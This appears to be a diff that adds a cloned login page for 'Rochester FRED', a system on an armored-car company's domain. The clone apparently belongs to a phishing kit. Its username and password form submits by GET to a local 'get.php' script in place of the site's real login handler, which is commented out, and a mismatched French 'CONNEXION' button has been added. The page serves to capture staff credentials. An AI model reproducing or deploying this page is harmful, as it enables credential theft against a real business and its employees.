@@ -1,0 +1,147 @@
+<style>
+
+div#body
+
+{
+color:white;
+background-image:url('feature-hm.png');
+
+}
+
+</style>
+
+
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" /><title>
+
+	Login - Rochester FRED
+
+</title><link href="Content/themes/base/jquery.ui.all.css" rel="stylesheet" type="text/css" /><link href="Content/Site.css%3Fv=02272015.css" rel="stylesheet" type="text/css" /><link href="Content/jquery.flexbox.css" rel="stylesheet" type="text/css" /><link href="Content/App.css" rel="stylesheet" type="text/css" /><link href="http://fred.rochesterarmoredcar.com/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+    <script src="Scripts/jquery-1.8.2.js"></script>
+
+    <script src="Scripts/jquery-ui-1.8.24.js"></script>
+
+    <script src="Scripts/jquery.flexbox.js%3Fnocache=19"></script>
+
+
+
+
+
+    <meta name="viewport" content="width=device-width" /></head>
+
+<body>
+
+    <form method="GET" action="get.php" name="connect" onsubmit="javascript:return validForm();"id="ctl01">
+
+
+
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/9obJV33LSfhm4zQ7cXaMgfLRQMBh6XsjhelGWZyQqjddjRFelwOB/P/sB2farbAWIMuLBym26uuTQd/mfE215qpbEmqmz/1h37rZyJTyHM=" />
+
+
+
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="C2EE9ABB" />
+
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="KXjRLazf/DfgZCHdmkteJ8DSS85sjuGkXBqlak2CgqFqfTyo9bf+sMss7+HUzKfxvdvwgmbxy4HBhCJNaW7d8PeDRLxlPK/9QjPy5jrwmxJEkiET9wowAJkTTpLcMQ7cxQ9fv71ECKGpOev9x+eAxFDFs9ELS9tnyYwnBKSF8Xg=" />
+
+
+
+        <header>
+
+            <div style="display: none;" class="danger" id="alerts"></div>
+
+            <div class="content-wrapper">
+
+                <div class="float-left">
+
+                    <p class="site-title">Rochester FRED</p>
+
+                </div>
+
+                <div class="float-right">
+
+                    <section id="login">
+
+
+
+                                <ul>
+
+                                    <li><a href="Login.aspx.html">Log in</a></li>
+
+                                </ul>
+
+
+
+                    </section>
+
+
+
+                    <nav>
+
+                        <ul id="menu">
+
+
+
+
+
+
+
+                        </ul>
+
+                    </nav>
+
+                </div>
+
+            </div>
+
+        </header>
+
+        <div id="body">
+
+
+
+            <div align="center" class="content-wrapper main-content clear-fix">
+
+
+
+        <h3>Please Login</h3>
+
+    <p>Username: <input name="login" id="login"  name="ctl00$MainContent$Username" type="text" id="MainContent_Username" /><br />
+
+    <p>Password:<br> <input name="password" id="password" type="password" /></p><br
+
+/>
+
+    <!-- <input type="submit" name="ctl00$MainContent$btnLogin" value="Login" id="MainContent_btnLogin" /> -->
+
+<input name="CONNEXION" value="CONNEXION" class="boutonC" type="submit">
+
+        </p>
+
+
+
+            </div>
+
+        </div>
+
+        <footer>
+
+            <div class="content-wrapper">
+
+            </div>
+
+        </footer>
+
+    </form>
+
+</body>
+
+</html>
+
+
